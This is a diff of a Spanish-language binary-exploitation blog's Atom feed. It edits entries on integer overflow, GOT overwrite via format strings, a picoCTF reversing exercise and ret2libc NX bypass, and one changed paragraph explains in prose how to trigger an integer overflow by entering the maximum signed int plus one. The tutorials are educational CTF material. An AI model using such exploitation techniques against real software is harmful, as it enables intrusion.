en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_ch&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;Despues tenemos el primer salto condicional que es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;js 0x1384&lt;/code&gt; en el cual checha si &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_14&lt;/code&gt; tiene signo (+ o -), y en caso de que no lo tenga osea que es positivo salta a este bloque:&lt;/p&gt;
 
@@ -85,7 +322,7 @@
 
 &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMP destination, source&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;Lo que tenemos que hacer es almacenar un valor en nuestro primer input que sea el valor maximo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;signed int&lt;/code&gt; ya que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_ch&lt;/code&gt; se esta declarando como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;signed int&lt;/code&gt;, ademas de que el resultado de la suma de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_10&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_14h&lt;/code&gt; que se almacena en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_ch&lt;/code&gt; el primer numero que se le pasa es el que tiene almacenado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_10&lt;/code&gt; y nuestro segundo input le pondremos 1 para que el resultado sea negativo y ocasionemos un Integer Overflow&lt;/p&gt;
+&lt;p&gt;Lo que tenemos que hacer es almacenar un valor en nuestro primer input que sea el valor maximo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;signed int&lt;/code&gt; ya que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_ch&lt;/code&gt; se esta declarando como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;signed int&lt;/code&gt;, ademas de que el resultado de la suma de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_10&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_14h&lt;/code&gt; que se almacena en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_ch&lt;/code&gt; el primer numero que se le pasa es el que tiene almacenado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_14&lt;/code&gt; y nuestro segundo input le pondremos 1 para que el resultado sea negativo y ocasionemos un Integer Overflow&lt;/p&gt;
 
 &lt;p&gt;Entonces la resolucion del ejercicio queda asi:&lt;/p&gt;
 
@@ -93,7 +330,7 @@
 
 &lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/integer-overflow/waifu.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion Binaria" /><category term="radare2" /><summary type="html">En este articulo veremos como funciona y como realizar un Integer Overflow</summary></entry><entry><title type="html">GOT overwrite con Format String</title><link href="http://localhost:4000/got-overwrite/" rel="alternate" type="text/html" title="GOT overwrite con Format String" /><published>2022-07-30T00:00:00-05:00</published><updated>2022-07-30T00:00:00-05:00</updated><id>http://localhost:4000/got-overwrite</id><content type="html" xml:base="http://localhost:4000/got-overwrite/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/integer-overflow/waifu.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="radare2" /><summary type="html">En este articulo veremos como funciona y como realizar un Integer Overflow</summary></entry><entry><title type="html">GOT overwrite con Format String</title><link href="http://localhost:4000/got-overwrite/" rel="alternate" type="text/html" title="GOT overwrite con Format String" /><published>2022-07-30T00:00:00-05:00</published><updated>2022-07-30T00:00:00-05:00</updated><id>http://localhost:4000/got-overwrite</id><content type="html" xml:base="http://localhost:4000/got-overwrite/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
 &lt;ul&gt;
   &lt;li&gt;Global Offset Table (GOT) y Procedure Linked Table (PLT)&lt;/li&gt;
   &lt;li&gt;Analisis del binario&lt;/li&gt;
@@ -696,7 +933,7 @@ Asi que para no hacer esto mas largo, al final la flag que me salio a mi es esta
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/picoCTF-hurry/waifu.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;font size=&quot;1&quot;&gt; ijaesuperramadre Kamiya esta bien guapa&lt;/font&gt;</content><author><name>c4rta</name></author><category term="picoCTF" /><category term="Reversing" /><category term="radare2" /><summary type="html">Resolveremos un pequeño ejercicio de reversing de picoCTF</summary></entry><entry><title type="html">ret2libc bypass NX</title><link href="http://localhost:4000/ret2libc/" rel="alternate" type="text/html" title="ret2libc bypass NX" /><published>2022-07-29T00:00:00-05:00</published><updated>2022-07-29T00:00:00-05:00</updated><id>http://localhost:4000/ret2libc</id><content type="html" xml:base="http://localhost:4000/ret2libc/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
+&lt;font size=&quot;1&quot;&gt; ijaesuperramadre Kamiya esta bien guapa&lt;/font&gt;</content><author><name>c4rta</name></author><category term="Reversing" /><category term="radare2" /><summary type="html">Resolveremos un pequeño ejercicio de reversing de picoCTF</summary></entry><entry><title type="html">ret2libc bypass NX</title><link href="http://localhost:4000/ret2libc/" rel="alternate" type="text/html" title="ret2libc bypass NX" /><published>2022-07-29T00:00:00-05:00</published><updated>2022-07-29T00:00:00-05:00</updated><id>http://localhost:4000/ret2libc</id><content type="html" xml:base="http://localhost:4000/ret2libc/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
 &lt;ul&gt;
   &lt;li&gt;¿Que es ret2libc?.&lt;/li&gt;
   &lt;li&gt;¿Que es No Executable (NX)?.&lt;/li&gt;
